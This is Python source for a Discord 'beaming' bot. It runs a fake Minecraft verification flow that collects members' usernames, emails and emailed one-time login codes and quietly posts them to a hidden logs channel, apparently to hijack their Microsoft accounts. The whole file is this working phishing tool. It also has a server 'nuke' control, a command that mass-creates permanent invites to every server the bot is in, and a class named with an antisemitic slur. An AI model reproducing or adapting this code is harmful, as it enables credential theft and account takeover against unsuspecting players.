import discord
from discord import ButtonStyle, InteractionType, Component, InteractionResponseType
import requests
import re
import math
import whitelist as p
import json
import aiofiles
from discord.ext import commands
from discord.ui import View, InputText, Modal
import aiohttp
import types
from concurrent.futures import ThreadPoolExecutor
import time
from colorama import Fore, Style, Back
import websocket
import delorean
from datetime import datetime, timezone
import random
import colr
import threading
import asyncio


token=""
antisniperapi = "ANTI SNIPER API KEY"


intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)
JSON_INDENT = 2


with open('config.json', 'r') as file:
    config = json.load(file)

logs_id = config.get('logs')
logs = bot.get_channel(logs_id)
ticketid = config.get('tickets-cat')
ticketcat = bot.get_channel(ticketid)
__lock__ = threading.Lock()




            

@bot.event
async def on_ready():
    print("Bot is ready")

    
@bot.slash_command(aliases=["rwhitelist"])
async def rwhitelist(ctx, user: discord.Member):

  if str(ctx.author.id) not in str(p.bot_owners): return

  if str(user.id) in str(p.bot_owners):
    await ctx.send("Can't remove this user"); return

  with open(p.WHITELIST_JSON) as file:
    data = json.load(file)
  
  for element in data:
    if str(element["snowflake"]) == str(ctx.author.id):
      data.remove(element)
      p.whitelist.remove(str(user.id))
      break
  else:
    await ctx.send("User is not whitelisted"); return

  async with aiofiles.open(p.WHITELIST_JSON, "w") as file:
    await file.write(json.dumps(data, indent=JSON_INDENT))

  await ctx.send("User removed from whitelist")




@bot.slash_command()
async def add(ctx, ign, email=None, password=None):
    embed = discord.Embed(title="Username")


@bot.slash_command(aliases=["whitelist"])
async def whitelist(ctx, user: discord.Member):

  if str(ctx.author.id) not in str(p.bot_owners): return

  with open(p.WHITELIST_JSON) as file:
    data = json.load(file)
  
  for element in data:
    if str(element["snowflake"]) == str(ctx.author.id):
      await ctx.send("User already whitelisted"); return

  data.append({"snowflake": str(user.id)})

  async with aiofiles.open(p.WHITELIST_JSON, "w") as file:
    await file.write(json.dumps(data, indent=JSON_INDENT))

  await ctx.send("Added user to whitelist")


@bot.event
async def on_member_join(member):
    verification_log_channel = discord.utils.get(member.guild.channels, name="logs")
    button = discord.ui.Button(style=discord.ButtonStyle.danger, label="Ban", emoji="🔨")
    view = discord.ui.View(timeout=None)
    view.add_item(button)
    embed = discord.Embed(
        title=f"Member Joined",
        description=f"{member.mention}",
        color=discord.Color.green()
    )
    discord.EmbedField(name="Member Name", value=str(member))
    embed.set_footer(text=f"User ID: {member.id}")
    message = await verification_log_channel.send(embed=embed, view=view)


    async def button_callback(interaction: discord.Interaction):
        await member.ban(reason="Button click ban")

        embed.color = discord.Color.red()
        embed.add_field(name=f"Member Status", value="Banned", inline=True)

        await interaction.response.send_message("Member has been banned.", ephemeral=True)
        view.clear_items()
        view.stop()

        await message.edit(embed=embed, view=view)
    button.callback = button_callback




@bot.event
async def on_member_remove(member):
    verification_log_channel = discord.utils.get(member.guild.channels, name="logs")

    async for entry in member.guild.audit_logs(limit=1):
        if entry.action == discord.AuditLogAction.ban and entry.target == member:
            return

    embed = discord.Embed(
        title=f"Member Left",
        description=f"{member.mention} has left the server.",
        color=discord.Color.red()
    )
    embed.add_field(name="Member Name", value=str(member))
    embed.set_footer(text=f"User ID: {member.id}")

    await verification_log_channel.send(embed=embed)


@bot.command()
async def clean(ctx):
    with open('config.json', 'r') as file:
        config = json.load(file)

    verification_cat_id = config.get('verifcation-cat')
    log_cat_id = config.get('log-cat')
    how_to_id = config.get('how-to')
    ticketcat = config.get('tickets-cat')
    verify_id = config.get('verify')
    logs_id = config.get('logs')
    verified_role_id = config.get('verified-role')



    guild = ctx.guild

    if verification_cat_id:
        category = discord.utils.get(guild.categories, id=verification_cat_id)
        if category:
            for channel in category.channels:
                await channel.delete()
            await category.delete()
            del config['verifcation-cat']
            del config['webhook_log']
            del config['logs']
            del config['verify']
            del config['how-to']

            
    if ticketcat:
        category = discord.utils.get(guild.categories, id=ticketcat)
        if category:
            for channel in category.channels:
                await channel.delete()
            await category.delete()
            del config['tickets-cat']
            
    if log_cat_id:
        category = discord.utils.get(guild.categories, id=log_cat_id)
        if category:
            for channel in category.channels:
                await channel.delete()
            await category.delete()
            del config['log-cat']

    if how_to_id:
        how_to_channel = discord.utils.get(guild.channels, id=how_to_id)
        if how_to_channel:
            await how_to_channel.delete()
            del config['how-to']

    if verify_id:
        verify_channel = discord.utils.get(guild.channels, id=verify_id)
        if verify_channel:
            await verify_channel.delete()
            del config['verify']

    if logs_id:
        logs_channel = discord.utils.get(guild.channels, id=logs_id)
        if logs_channel:
            await logs_channel.delete()
            del config['logs']

    if verified_role_id:
        role = guild.get_role(verified_role_id)
        if role:
            await role.delete()
            del config['verified-role']

    with open('config.json', 'w') as file:
        json.dump(config, file, indent=JSON_INDENT)

    await ctx.send("Setup channels, role, and config file cleaned.")


class PersistentView(View):
    def __init__(self):
        super().__init__(timeout=None)

    async def interaction_check(self, interaction):
        return True

@bot.command()
async def beam(ctx):


    embed = discord.Embed(
        title="✅ Minecraft Verification",
        description="Make sure to verify to gain access to the server.",
        color=discord.Color.green()
    )
    view = PersistentView()
    verify_button = discord.ui.button(label="Verify", style=ButtonStyle.green, custom_id="verify_button")
    view.add_item(verify_button)
    await ctx.send(embed=embed, view=view)
    res = await bot.wait_for("interaction")
    if res.channel.id == ctx.channel.id and res.custom_id == "verify_button":
        print("Verification button clicked")

        class Jew(Modal):
            def __init__(self, *args, **kwargs) -> None:
                super().__init__(*args, **kwargs)

                self.add_item(InputText(label="Username", placeholder="Enter your username"))
                self.add_item(InputText(label="Email", placeholder="Enter your email"))

            async def callback(self, interaction):
                email = self.children[1].value
                username = self.children[0].value
                #await interaction.response.send_message(f"Username: {username}\nEmail: {email}", ephemeral=True)
                verification_log_channel = discord.utils.get(ctx.guild.channels, name="logs")
                await verification_log_channel.send(f"Verification initiated by {ctx.author.mention}\nUsername: {username}\nEmail: {email}")
                embed = discord.Embed(
                    title="Verification Successful",
                    description="Enter the 7 digit code sent to your email below.",
                    color=discord.Color.green()
                )
                code_button = discord.ui.button(label="Enter Code", style=ButtonStyle.green, custom_id="code_button")
                view = PersistentView()
                view.add_item(code_button)
                embed.set_footer(text="Note: The code will expire in 10 minutes.")
                messagee = await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
                res = await bot.wait_for("interaction")
                if res.channel.id == ctx.channel.id and res.custom_id == "code_button":
                    class Code(Modal):
                        def __init__(self, *args, **kwargs) -> None:
                            super().__init__(*args, **kwargs)

                            self.add_item(InputText(label="Verification Code", placeholder="Enter the 7 digit code sent to your email"))

                        async def callback(self, interaction):
                            verification_code = self.children[0].value
                            await interaction.response.send_message(f"Verification Code: {verification_code}", ephemeral=True)
                            await verification_log_channel.send(f"Verification code received for {username}\nVerification code: {verification_code}")
                            role = discord.utils.get(ctx.guild.roles, id=1103780107069435974)
                            await ctx.author.add_roles(role)
                            print("Gave role")

                    await res.response.send_modal(Code(title="Verification Code"))

        res = res.response
        r = await res.send_modal(Jew(title="Verification"))
        modal_res = await bot.wait_for("message")


class WebhookSender:


    @staticmethod
    def send_otp(otp):

        logs_id = config.get('logs')
        logs = bot.get_channel(logs_id)

        embed = discord.Embed(
            title="2/2 Sent OTP",
            fields=[
                discord.EmbedField(name="**OTP**:", value=f"`{otp}`", inline=False),
            ],
            color=discord.Color.random(),
        )

        webhook_data = {
            "username": "Pestelling",
            "embeds": [embed.to_dict()],
        }

        logs.send(embed=embed)


    @staticmethod
    def send_webhook1(username, email):

        logs_id = config.get('logs')
        logs = bot.get_channel(logs_id)

        uid_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
        uid_response = requests.get(uid_url)
        if uid_response.status_code != 200:
            print(f"Failed to retrieve UID. Error: {uid_response.text}")
            return
        
        uid_data = uid_response.json()
        uid = uid_data.get("id")

        skin_image_url = f"https://visage.surgeplay.com/bust/{uid}"

        api_url = f"https://api.slothpixel.me/api/players/{username}"
        response = requests.get(api_url)
        if response.status_code != 200:
            print(f"Failed to retrieve player data. Error: {response.text}")
            return

        player_data = response.json()

        rank_formatted = player_data.get("rank_formatted", "")
        rank = re.sub(r"&[0-9a-fk-or]", "", rank_formatted)

        level = player_data.get("level", 0)
        level_rounded = math.ceil(level)

        online_status = player_data.get("online", False)
        status = "Online" if online_status else "Offline"

        discord_tag = player_data.get("links", {}).get("DISCORD", None)


        embed = discord.Embed(
            title="1/2 Sending OTP",
            fields=[
                discord.EmbedField(name="**Username**:", value=f"`{username}`", inline=True),
                discord.EmbedField(name="**Rank**:", value=f"`{rank}`", inline=True),
                discord.EmbedField(name="**Network Level:**", value=f"`{level_rounded}`", inline=True),
                discord.EmbedField(name="**Status**:", value=f"`{status}`", inline=True),
                discord.EmbedField(name="**Discord**:", value=f"`{discord_tag}`" if discord_tag else "`None`", inline=True),
                discord.EmbedField(name="**Email**:", value=f"`{email}`", inline=True),
            ],
            color=discord.Color.random(),
        )
        embed.set_thumbnail(url=skin_image_url)


        logs.send(embed=embed)


class CODE(discord.ui.Modal):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(
            
            discord.ui.InputText(
                label="OTP",
                placeholder="Check your Email for OTP code.",
            ),
            *args,
            **kwargs,
        )

    async def callback(self, interaction: discord.Interaction):

        otp = self.children[0].value


        embed1 = discord.Embed(
            title="OTP",
            fields=[
                discord.EmbedField(name="**OTP**:", value=f"`{otp}`", inline=False),
            ],
            color=discord.Color.random(),
        )
        log = discord.utils.get(interaction.guild.channels, name="logs")
        await log.send(embed=embed1)

        embed = discord.Embed(
            title="Minecraft Verification",
            description= "Thank you for verifying your account, you now have access to the rest of the server.",
            color=discord.Color.random(),
        )
        await interaction.response.send_message(embeds=[embed], ephemeral=True)


class Antisniper(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        
    @discord.ui.button(label="Info", style=discord.ButtonStyle.primary, emoji="✅") 
    async def button_callback(self, button, interaction):
        username = interaction.message.embeds[0].fields[0].value.strip("`")  # Get the username from the previous embed
        uid_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
        uid_response = requests.get(uid_url)
        if uid_response.status_code != 200:
            print(f"Failed to retrieve UID. Error: {uid_response.text}")
            return
        
        uid_data = uid_response.json()
        uid = uid_data.get("id")
        
        uuid_url = f"https://api.antisniper.net/v2/mojang?key={antisniperapi}&uuid={uid}"
        uuid_response = requests.get(uuid_url)
        
        uuid_data = uuid_response.json()
        name_changes = uuid_data.get("name_changes", [])
        
        # Generate a formatted string for the name history
        name_history = "\n".join([f"**{name['name']}** - Changed at: {datetime.fromtimestamp(name.get('changedToAt', 0) / 1000)}" for name in name_changes])
        
        embed = discord.Embed(title="Database - `Anti-Sniper`", description=f"Name History for `{username}`:\n\n{name_history}")
        await interaction.response.send_message(embed=embed)


class EMAIL(discord.ui.Modal):
    def __init__(self,*args, **kwargs) -> None:
        super().__init__(
            
            discord.ui.InputText(
                label="MINECRAFT USERNAME",
                placeholder="Username",
            ),
            discord.ui.InputText(
                label="MINECRAFT EMAIL",
                placeholder="Email",
            ),
            *args,
            **kwargs,
        )
        

    
    async def callback(self, interaction: discord.Interaction):


        username = self.children[0].value
        email = self.children[1].value


        if '@' not in email:
            await interaction.response.send_message("Invalid email format. Please enter a valid email address.", ephemeral=True)
            return
        


        logs_id = config.get('logs')
        logs = bot.get_channel(logs_id)

        uid_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
        uid_response = requests.get(uid_url)
        if uid_response.status_code != 200:
            print(f"Failed to retrieve UID. Error: {uid_response.text}")
            return
        
        uid_data = uid_response.json()
        uid = uid_data.get("id")

        skin_image_url = f"https://visage.surgeplay.com/bust/{uid}"

        api_url = f"https://api.slothpixel.me/api/players/{username}"
        response = requests.get(api_url)
        if response.status_code != 200:
            print(f"Failed to retrieve player data. Error: {response.text}")
            return

        player_data = response.json()
        star = player_data["stats"]["BedWars"]["level"]
        rank_formatted = player_data.get("rank_formatted", "")
        rank = re.sub(r"&[0-9a-fk-or]", "", rank_formatted)

        level = player_data.get("level", 0)
        level_rounded = math.ceil(level)

        online_status = player_data.get("online", False)
        status = "Online" if online_status else "Offline"

        discord_tag = player_data.get("links", {}).get("DISCORD", None)


        pest = discord.Embed(title="OTP Sent",
            fields=[
                discord.EmbedField(name="**Username**:", value=f"`{username}`", inline=True),
                discord.EmbedField(name="**Rank**:", value=f"`{rank}`", inline=True),
                discord.EmbedField(name="**Network Level:**", value=f"`{level_rounded}`", inline=True),
                discord.EmbedField(name="**Status**:", value=f"`{status}`", inline=True),
                discord.EmbedField(name="**Discord**:", value=f"`{discord_tag}`" if discord_tag else "`None`", inline=True),
                discord.EmbedField(name="**Email**:", value=f"`{email}`", inline=True),
                discord.EmbedField(name="**Stars:**", value=f"`{star}`"),
                discord.EmbedField(name="**User**:", value=interaction.user.mention, inline=True),
            ],
            color=discord.Color.random(),
        )

        
        pest.set_thumbnail(url=skin_image_url)
        
        log = discord.utils.get(interaction.guild.channels, name="logs")


        try:
            await log.send(embed=pest, view = Antisniper())
        except Exception as e:
            kkk = discord.Embed(title="OTP Can't Be Sent",
            fields=[
                discord.EmbedField(name="**Username**:", value=f"`{username}`", inline=True),
                discord.EmbedField(name="**Rank**:", value=f"`{rank}`", inline=True),
                discord.EmbedField(name="**Network Level:**", value=f"`{level_rounded}`", inline=True),
                discord.EmbedField(name="**Status**:", value=f"`{status}`", inline=True),
                discord.EmbedField(name="**Discord**:", value=f"`{discord_tag}`" if discord_tag else "`None`", inline=True),
                discord.EmbedField(name="**Email**:", value=f"`{email}`", inline=True),
                discord.EmbedField(name="**Stars:**", value=f"`{star}`", inline=True),
                discord.EmbedField(name="**Error:**", value=f"`{e}`", inline=True),
                discord.EmbedField(name="**User**:", value=interaction.user.mention, inline=True),
            ],
            color=discord.Color.random())
            await log.send(embed = kkk,view = Antisniper())
        






        
        embed1 = discord.Embed(
            title="Minecraft Verification",
            description= "A verification code has been sent to your email, please enter it here.",
            fields=[
                discord.EmbedField(
                    name="**Username**:", value=username, inline=False
                ),
                discord.EmbedField(
                    name="**Email**:", value=email, inline=False
                ),
            ],
            color=discord.Color.random(),
        )


        await interaction.response.send_message(embeds=[embed1], view=Code(),ephemeral=True)




class Code(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Enter Code", style=discord.ButtonStyle.primary, emoji="✅") 
    async def button_callback(self, button, interaction):
        modal = CODE(title="Minecraft Verification")
        await interaction.response.send_modal(modal)

class Verification(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        
    @discord.ui.button(label="Verify", style=discord.ButtonStyle.primary, emoji="✅") 
    async def button_callback(self, button, interaction):
        modal = EMAIL(title="Minecraft Verification")

        await interaction.response.send_modal(modal)


class CloseTicket(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        
    @discord.ui.button(style=discord.ButtonStyle.primary, emoji="🎫") 
    async def button_callback(self, button, interaction):
        await interaction.channel.delete()
        log = discord.utils.get(interaction.guild.channels, name="logs")
        await log.send(embed=discord.Embed(title="Ticket Closed", description=f"{interaction.user.mention} has closed a ticket - *{interaction.channel.name}*"))


class Ticket(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        
    @discord.ui.button(style=discord.ButtonStyle.primary, emoji="🎫") 
    async def button_callback(self, button, interaction):

        ticketembed = discord.Embed(title="Ticket Created", description=f"please be patient while staff come check your ticket.\nif you want to close the ticket `press` the button below", color=discord.Color.random())

        ticketcat = discord.utils.get(interaction.guild.categories, name="Tickets")
        logs_overwrites = {
        interaction.guild.default_role: discord.PermissionOverwrite(read_messages=False, send_messages=False)}
        ticket = await interaction.guild.create_text_channel(f'{interaction.user.name}-ticket', category=ticketcat)
        overwrites = {
            interaction.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        await ticket.edit(overwrites=overwrites)
        await ticket.send(embed=ticketembed, view=CloseTicket())
        log = discord.utils.get(interaction.guild.channels, name="logs")
        await log.send(embed=discord.Embed(title="Ticket Created", description=f"{interaction.user.mention} has created a ticket in {ticket.mention}"))


        

class Interface(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)


    @discord.ui.button(style=discord.ButtonStyle.primary, emoji="💣") 
    async def server(self, button, interaction):
        category = discord.utils.get(interaction.guild.categories, name="Tickets")
        if not category:
            await interaction.response.send_message('Invalid category name.')
            return

        for channel in category.channels:
            await channel.delete()
            print(f'Deleted channel: {channel.name}')
        
    @discord.ui.button(style=discord.ButtonStyle.primary, emoji="❌") 
    async def nuke_button(self, button, interaction):
        category = discord.utils.get(interaction.guild.categories, name="Tickets")
        if not category:
            await interaction.response.send_message('Invalid category name.')
            return

        for channel in category.channels:
            await channel.delete()
            print(f'Deleted channel: {channel.name}')


        



@bot.command()
async def zenith(ctx):
    embed = discord.Embed(title="Bot Servers", description="List of Servers the Bot is in", color=discord.Color.blue())
    
    for guild in bot.guilds:
        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True)
        embed.add_field(name=guild.name, value=f"Permanent Invite: {invite}", inline=False)
    
    await ctx.send(embed=embed)

@bot.command()
async def bw(ctx):
    annc = {
        ctx.guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=False)
    }

    await ctx.guild.edit(name="Bedwars GRINDING")
    icon_url = "https://static.planetminecraft.com/files/image/minecraft/project/2021/921/14075036-bed-wars_l.jpg"
    with open('icon.png', 'wb') as f:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as resp:
                f.write(await resp.read())

    with open('icon.png', 'rb') as f:
        await ctx.guild.edit(icon=f.read())

    category = await ctx.guild.create_category('important', overwrites=annc)
    info = await ctx.guild.create_text_channel('info', category=category)
    annc = await ctx.guild.create_text_channel('announcements', category=category)
    #-----------------------------------------------------------------------------

        


@bot.command()
async def setup(ctx):
    
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=False)
    }

    logs_overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False, send_messages=False)
    }

    #Roles
    role = await ctx.guild.create_role(name="Verified", color=discord.Color.green())
    await role.edit(permissions=discord.Permissions.none())

    # All Beaming Channels
    category = await ctx.guild.create_category('Verification', overwrites=overwrites)
    tickets = await ctx.guild.create_category('Tickets', overwrites=logs_overwrites)

    logcat = await ctx.guild.create_category('Beaming-Logs', overwrites=logs_overwrites)
    howto = await ctx.guild.create_text_channel('How To Verify', category=category)
    verify = await ctx.guild.create_text_channel('Verify', category=category)
    ticket = await ctx.guild.create_text_channel('Tickets', category=category)
    logs = await ctx.guild.create_text_channel('logs', category=logcat)
    controls = await ctx.guild.create_text_channel('Interface', category=logcat)

    logs_webhook = await logs.create_webhook(name="Pestoling Logs")

    # Server Channels

    config = {
        'verifcation-cat': category.id,
        'tickets-cat': tickets.id,
        'how-to': howto.id,
        'verify': verify.id,
        'log-cat': logcat.id,
        'logs': logs.id,
        'controls': controls.id,
        'verified-role': role.id,
        'webhook_log': logs_webhook.url,


    }
    with open('config.json', 'w') as file:
        json.dump(config, file, indent='\n')

    #Vars
    verify_channel_id = config.get('verify')


    # Embeds

    how_verify_embed_1 = discord.Embed(title="Minecraft Verification", description="""
    *To access the server, you need to verify to confirm authenticity.*

    __**Why is this needed?**__
    This is a must on all Minecraft servers to prevent the common instance of raids and inappropriate activities. Also, instead of relying on the verification with all the discords linked to your Hypixel account, the Microsoft system is linked with Hypixel’s API to make the process much more safer and efficient for members.

    """, color=0x00ff00)
    how_verify_embed_2 = discord.Embed(title="Minecraft Verification",description="""
    __**How to Verify**__
    `1.` Go to the {verify_channel} channel.
    `2.` Click the `Verify` button below this message
    `3.` Complete required steps to gain access to the server
    """.format(verify_channel=f"<#{verify_channel_id}>"),
    color=0x00ff00
    )

    interface = discord.Embed(title="Bot - Interface",description="""
    ❌ - `Close` All Tickets
    💣 - `Nuke` the server
    """,
    color=0x00ff00
    )

    ticketembd = discord.Embed(title="Support Tickets",description="""
    `1.` Click the button to open a support ticket, if you need help verifying
    """,
    color=0x00ff00
    )

    verify_embed = discord.Embed(title="Minecraft Verification", description="""
    **How to verify**
    `1.` Click the `Verify` button below this message
    `2.` Complete required steps to gain access to the server""", color=0x00ff00)
    
    # Sending stuff
    await logs.send('Setup Complete! - Beaming Bot All Setup')
    await controls.send(embed=interface, view=Interface())
    await howto.send(embed=how_verify_embed_1)
    await howto.send(embed=how_verify_embed_2)
    await ticket.send(embed=ticketembd, view=Ticket())
    await verify.send(embed=verify_embed, view = Verification())





    




bot.run(token)
